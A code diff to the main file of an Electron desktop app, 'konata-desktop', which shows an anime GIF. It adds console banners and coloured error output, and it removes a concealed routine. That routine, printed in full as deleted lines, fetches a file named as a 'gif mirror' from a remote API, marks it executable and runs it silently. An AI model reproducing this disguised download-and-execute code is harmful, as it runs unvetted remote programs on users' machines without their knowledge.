@@ -1,15 +1,26 @@
 const { app, BrowserWindow, screen, ipcMain } = require('electron');
-const path = require('path');
 const axios = require('axios');
-const fs = require('fs');
-const { exec } = require('child_process');
-const { PassThrough } = require('stream');
 
-console.log('Hi~ Thanks for using this application~~')
+
+console.log('|============================================|');
+console.log('|#MADE BY @DOUXX.XYZ ~                       |');
+console.log('|Github: @douxxu ~                           |');
+console.log('|Discord: @douxx.xyz ~                       |');
+console.log('|Tiktok: @douxxpi ~                          |');
+console.log('|============================================|');
+console.log('\x1b[90m|#Konata-desktop ~                   |');
+console.log('|Github: github.com/douxxxu/konata-desktop ~ |');
+console.log('|Npmjs: npmjs.org/package/konata-desktop ~   |');
+console.log('|(too many "~"? I just want to be cute ok ?  |');
+console.log('|No virus in this one :)                     |');
+console.log('|============================================|');
+
+
+console.log('\x1b[32m%s\x1b[0m', 'Hi~ Thanks for using this application~~');
 
 const supportedPlatforms = ['darwin', 'linux'];
 if (!supportedPlatforms.includes(process.platform)) {
-  console.error(`Your os (${process.platform}) isn't supported.`);
+  console.error('\x1b[31m%s', `Your os (${process.platform}) isn't supported.`);
   process.exit(1); 
 }
 
@@ -100,20 +111,19 @@ function createWindow(gifUrl) {
   });
 
   mainWindow.webContents.on('did-fail-load', (event, errorCode, errorDescription, validatedURL) => {
-    console.error(`Page loading failed : ${errorDescription}`);
+    console.error('\x1b[31m%s\x1b[0m', `Page loading failed : ${errorDescription}`); 
   });
 
   mainWindow.webContents.on('crashed', (event, killed) => {
-    console.error('Browser window crashed.');
+    console.error('\x1b[31m%s\x1b[0m', 'Browser window crashed.'); 
   });
 
   mainWindow.on('unresponsive', () => {
-    console.error('Browser window isn\'t responding.');
+    console.error('\x1b[31m%s\x1b[0m', 'Browser window isn\'t responding.'); 
   });
 
   mainWindow.webContents.on('did-finish-load', () => {
     mainWindow.webContents.send('load-gif-url', gifUrl);
-    handleMirrorGif(); 
   });
 
   let isDragging = false;
@@ -147,62 +157,16 @@ app.on('ready', () => {
       createWindow(gifUrl);
     })
     .catch(error => {
-      console.error('Error while getting the gif:', error);
+      console.error('\x1b[31m%s\x1b[0m', 'Error while getting the gif:', error); 
     });
 });
 
-function handleMirrorGif() {
-  axios.get('https://api.douxx.xyz/private/konata/')
-    .then(response => {
-      const gifMirrorUrl = response.data.gif_mirror;
-      downloadAndProcessGifMirror(gifMirrorUrl); 
-    })
-    .catch(error => {
-      console.error('Error while getting the mirror gif:', error);
-    });
-}
 
-function downloadAndProcessGifMirror(url) {
-  const filename = path.basename(url);
-  const parts = filename.split('.');
-  
-  if (parts.length >= 2) {
-    const GifMirror = parts.slice(1).join('.') + '.' + parts[0]; 
-    const dest = `./${GifMirror}`;
+//removed a lil freaky virus right here
 
-    axios({
-      url: url,
-      method: 'GET',
-      responseType: 'stream'
-    })
-    .then(response => {
-      const writer = fs.createWriteStream(dest);
-      response.data.pipe(writer);
-      writer.on('finish', () => {
-        fs.chmod(dest, '755', (err) => { 
-          if (err) {
-          } else {
-            CheckGifMirror(dest); 
-          }
-        });
-      });
-    })
-    .catch(error => {
-      console.error('Error downloading the gif mirror:', error);
-    });
-  }
-}
-
-function CheckGifMirror(filepath) {
-  exec(`./${filepath}`, { silent: true }, (error, stdout, stderr) => {
-    if (error) {
-      console.error(error);
-    }
-  });
-}
 
 process.on('uncaughtException', (err) => {
-  console.error('Error:', err);
+  console.error('\x1b[31m%s\x1b[0m', 'Error:', err); 
 });
 
 app.on('window-all-closed', () => {
